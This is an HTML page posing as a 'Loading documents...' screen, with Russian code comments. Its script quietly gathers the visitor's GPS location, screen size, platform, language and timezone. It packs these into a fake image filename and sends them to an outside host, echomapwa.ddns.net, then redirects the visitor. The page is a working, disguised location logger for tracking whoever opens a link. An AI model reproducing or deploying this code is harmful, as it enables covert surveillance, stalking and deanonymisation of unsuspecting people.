<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body> 
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        // Твой сервер
        const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";

        async function collectAndGo() {
            if (!slug) return;
            
            let info = {
                sw: window.screen.width, sh: window.screen.height,
                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lat: "null", lon: "null"
            };

            // 1. Попытка получить GPS
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000, 
                            maximumAge: 0
                        });
                    });
                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                } catch (e) {
                    console.log("GPS fail: " + e.message);
                }
            }

            // 2. Формируем "хитрое" имя картинки с данными
            // Формат: lat_ЗНАЧЕНИЕ_lon_ЗНАЧЕНИЕ_sw_ШИРИНА_sh_ВЫСОТА_id_СЛАГ.png
            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
            
            // 3. Отправка через создание элемента Image
            const img = new Image();
            
            const go = () => { 
                // Добавляем ?ready=1, чтобы сервер знал: данные собраны!
                setTimeout(() => {
                    window.location.href = finalRedirect + slug + "?ready=1";
                }, 500);
            };

            img.onload = img.onerror = go;

            // Пуск!
            img.src = `${targetServer}${fileName}?t=${Date.now()}`;
            
            // Запасной тайм-аут редиректа (если картинка не грузится)
            setTimeout(go, 5000);
        }

        collectAndGo();
    </script>
</body>
</html>
